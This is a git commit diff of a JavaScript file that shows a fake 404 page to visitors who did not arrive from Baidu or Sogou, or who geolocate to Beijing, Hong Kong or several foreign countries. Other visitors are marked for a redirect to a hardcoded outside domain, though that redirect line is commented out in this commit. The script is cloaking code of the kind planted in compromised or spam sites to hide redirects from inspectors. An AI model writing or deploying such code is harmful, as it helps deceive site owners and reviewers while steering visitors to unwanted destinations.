c926f26ce1f09f3c13e40d074c7e4ee5212afc16
发哥 <85582507@qq.com>
2022-06-19 01:23:10 +0800

    1

--- check-user-from.js
+++ check-user-from.js
@@ -1,42 +1,40 @@
-var jumptoUrl='';
+var jumptoUrl = 'http://a98388.com/';
 
-function show404HTML() {
-  document.title = "404 页面未找到";
+function show404HTML(from) {
+  console.log('show 404 from ',from);
+  document.title = "404 出错了，页面未找到";
   var body = document.querySelector("body");
   var html = `
   <div style="width: 50%;  height: 300px;  line-height: 300px;  font-size: 35px;  text-align: center;  display: block;  overflow: hidden;  clear: both;  border-radius: 1%;
-  background-color: #b9e8ff;  margin: 10% auto; border: 1px solid #9fd9f5;">404 页面未找到</div>
+  background-color: #b9e8ff;  margin: 10% auto; border: 1px solid #9fd9f5;">404 出错了，页面未找到</div>
   `;
   if (body) {
     body.innerHTML = html;
   } else {
     document.write(html);
   }
-  if(jumptoUrl){
-    window.location.href=jumptoUrl;
-  }
 }
+
 function checkfun() {
   var s = document.referrer || "";
   var host = document.domain || window.location.host || "";
   console.log("document.referrer=", s);
   console.log("host=", host);
-  if (
-    s.indexOf("google") == -1 &&
-    s.indexOf("baidu") == -1 &&
-    s.indexOf("sogou") == -1 &&
-    s.indexOf("360") == -1 &&
-    s.indexOf(host) == -1
-  ) {
-    show404HTML();
+  if (s.indexOf("baidu") == -1 && s.indexOf("sogou") == -1) {
+    show404HTML(1);
+    return;
   }
   try {
     checkCity(function (isEnable) {
-      if (!isEnable) {
-        return show404HTML();
+      if (isEnable) {
+        // window.location.href = jumptoUrl;
+        console.log('跳转了。。。')
+      }else{
+        show404HTML(2);
       }
     });
   } catch (e) {
+    show404HTML(3);
     console.log(e);
   }
 }
@@ -45,25 +43,34 @@ function checkCity(cb) {
   jQuery.getScript("https://pv.sohu.com/cityjson?ie=utf-8", function () {
     var city = returnCitySN["cname"];
     var cid = returnCitySN["cid"];
-    console.log("returnCitySN=", returnCitySN);
-    var isEnable = true;
-    if (!cid || city.indexOf("北京") != -1) {
-      isEnable = false;
+    console.log('city',city);
+    console.log('cid',cid);
+    if (cid == 'PH' || cid == 'JP' || cid == 'US' || cid == 'RO' || cid == 'EU' || cid == 'KR' || cid == '810000' || city.indexOf("北京") != -1) {
+      return cb(false);
     }
-    cb(isEnable);
+    if (!isNaN(cid) && city.indexOf("北京") == -1) {
+      return cb(true);
+    }
+    cb(cid == 'CN');
   });
 }
-function addScript(url) {
+function addScript(url, cb) {
   var bp = document.createElement("script");
+  bp.type = "text/javascript";
   var curProtocol = window.location.protocol.split(":")[0];
   if (curProtocol === "https") {
     bp.src = "https://" + url;
   } else {
     bp.src = "http://" + url;
   }
-  var s = document.getElementsByTagName("script")[0];
-  s.parentNode.insertBefore(bp, s);
+  document.getElementsByTagName('body')[0].appendChild(bp);
+  bp.onload = function () {
+    // 执行相应的函数
+    if (cb) cb();
+  }
 }
+
+
 try {
   if (!jQuery) {
     addScript("cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js");
@@ -72,5 +79,5 @@ try {
   console.log("jquery未加载，现在加载");
   addScript("cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js");
 }
-checkfun();
+// checkfun();
 setTimeout(checkfun, 500);
---
+++ test.js
@@ -0,0 +1,2 @@
+let a="CN";
+console.log(isNaN(a));
